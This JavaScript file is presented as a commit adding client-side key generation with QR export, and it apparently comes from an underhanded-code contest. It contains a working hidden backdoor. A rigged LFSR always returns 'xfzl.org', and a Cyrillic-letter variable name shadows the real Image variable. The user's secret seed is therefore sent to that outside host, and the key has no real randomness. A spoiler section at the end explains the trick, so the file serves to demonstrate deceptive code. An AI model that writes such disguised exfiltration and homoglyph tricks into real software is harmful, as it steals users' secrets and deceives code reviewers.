//https://jsfiddle.net/qpfs1vjz/0/

/** Commit id #31337 - Added client-side keygen for VDC
  * Datetime: 2015-09-11 14:40
  * Author: Calle Svensson <calle.svensson@zeta-two.com>
  *
  * This commits adds client-side key generation functionality to the VDC platform.
  * It also enables export of the key to the VDC app via a generated QR code.
  * The actual QR generation function is not in place but Bob(tm) said he would have it by Monday.
  * Just drop it in as a replacement for createQRBase64()
 **/


// LFSR random number generator
// Tested for uniform behavior across platforms
LFSR = function(l,f,s,r){f=0x9b6dc5;for(r=s="",l*=8;l--;)l&7?s=s<<1|(f=f>>1^(f&1&&0x80000057))&1:(r+=String.fromCharCode(s),s=0);return r}

// Converts a message into a base64 encoded PNG QR code
// TODO: Not implemented, just returns test image
function createQRBase64(message) {
    return "iVBORw0KGgoAAAANSUhEUgAAANwAAADcCAIAAACUOFjWAAAABmJLR0QA/wD/AP+gvaeTAAADi0lEQVR4nO3dwYrbMBRA0br0/395uuiuiOJBlXTtnLNOSGIuWjyenevr6+sHlPw8/QXgb6IkR5TkiJIcUZIjSnJESY4oyRElOaIkR5TkiJIcUZIjSnJESY4oyRElOaIkR5TkiJIcUZIjSnJESY4oyRElOaIkR5TkiJIcUZIjSnJESY4oyRElOaIkR5Tk/Nr5Ydd17fy4OyYf+X7/F93/oPddpe9yUpIjSnJESY4oyRElOaIkZ+tIaGjbuOH+qGX4yuH3nBz03H978Cqt46QkR5TkiJIcUZIjSnJESc75kdDQ5GBi81bLKW+9Sk5KckRJjijJESU5oiRHlOSIkhxRkiNKckRJjijJESU5oiQnuiX0FIXbrN7HSUmOKMkRJTmiJEeU5IiSnOhIKHtP0x3bvvyjr9I/OCnJESU5oiRHlOSIkhxRknN+JPQhizaTj5f+kKv0h5OSHFGSI0pyREmOKMkRJTnXWzdNeC4nJTmiJEeU5IiSHFGSI0pyzm8JDb1vp2b45e//zG2/qDAidFKSI0pyREmOKMkRJTmiJOdJW0Ir/nP97PBock40dPbt/4WTkhxRkiNKckRJjijJESU5W7eE7s9fJmcQk9OfFQOUs2s+hUHPfU5KckRJjijJESU5oiRHlOSc3xJasfszaduizbb742wJwRRRkiNKckRJjijJESU50S2hocnBxLYByuQr7zs+zlvESUmOKMkRJTmiJEeU5IiSnPNbQkFnh0fb7vwqLAQNOSnJESU5oiRHlOSIkhxRkvOkLaEVtm0erTA5Zso+dchJSY4oyRElOaIkR5TkiJKc839Cv23ccPbWrRUPol5x6WwJwYAoyRElOaIkR5TkiJKc8yOhobNPHVox6JlcyRm+8q13kzkpyRElOaIkR5TkiJIcUZITHQk9xYr/mz87lLElBAOiJEeU5IiSHFGSI0pyjIQGVjyjZ/KDJp3duvouJyU5oiRHlOSIkhxRkiNKcqIjobO7Kitu3VrxLKHJ29aynJTkiJIcUZIjSnJESY4oyTk/Egr+DdnQ2Uf8TH6lybfbEuLTiZIcUZIjSnJESY4oybmetT/CJ3BSkiNKckRJjijJESU5oiRHlOSIkhxRkiNKckRJjijJESU5oiRHlOSIkhxRkiNKckRJjijJESU5oiRHlOSIkhxRkiNKckRJjijJESU5oiRHlOSIkhxRkiNKckRJjijJ+Q1MZvSvLGWbfQAAAABJRU5ErkJggg==";
}

function generateKey() {
    // Get input and result divs
    input = document.getElementById('user-input').value;
    resdiv = document.getElementById('result');

    // Gather input until we have 32 bytes of data
    if(input.length == 0) {
        resdiv.innerHTML = "Please provide 32 random characters as seed.";
    } else if(input.length < 32) {
        resdiv.innerHTML = "Need " + (32-input.length) + " more characters.";
    // Create key
    } else if(input.length == 32) {
        resdiv.innerHTML = "Computing key...";

        // Prepare QR code generation
        keydata = new Image;
        // Create QR seed
        keydatа = {
            keydatа: keydata,
            src: LFSR(8, Math.floor(Math.random() * 10)) /* Generate 64-bit seed */
        }
        // Add delimiters for image generation
        keydata.src = "//" + keydatа.src + "//";
        keydata.src += input; /* Add user input to seed */

        // XOR input with random seed and encode to get key
        key = "";
        for(i = 0; i < 4; i++) {
            for(j = 0; j < 8; j++) {
                key += String.fromCharCode((keydatа.src.charCodeAt(2+j) + i) ^ keydatа.src.charCodeAt(2+8+2+8*i+j) ^ 0x40);
            }
        }
        key = btoa(key.substr(2));

        // Generate QR image and display result
        // Note: "heavy" computation. Don't do this on UI thread
        setTimeout(function() {
            keydata.src = "data:image/png;base64," + createQRBase64(key);
            resdiv.innerHTML = "Key is: " + key + "<br>QR code image:";
            resdiv.appendChild(keydata);
        }, 1000);
    }

}

// Read more at http://misdirect.ion.land

// SPOILER ALERT! EXPLANATION BELOW. SCROLL TO REVEAL!


















// Hint 1: UTF8
// Scroll for hint 2









// Hint 2: Randomness
// Scroll for hint 3










// Hint 3: Images
// Scroll for full explanation








// Explanation:
// The LFSR function is rigged to always generate "xfzl.org".
// "keydatа" and "keydata" are different variables. One ends with a cyrillic "а" and  the other with a latin "a".
// Therefore line 37 does not overwrite line 35 and when we set the .src property of keydata we actually set it on the Image object
// This is then cooked together with delimiters and the user input to set it to "//xfzl.org//<input>"
// By using a timeout and not changing it again immediately to the QR code image data we cause a request to "xfzl.org" with the user input
// which can then be used to recreate the key since there is actually no randomness in the algorithm at all.
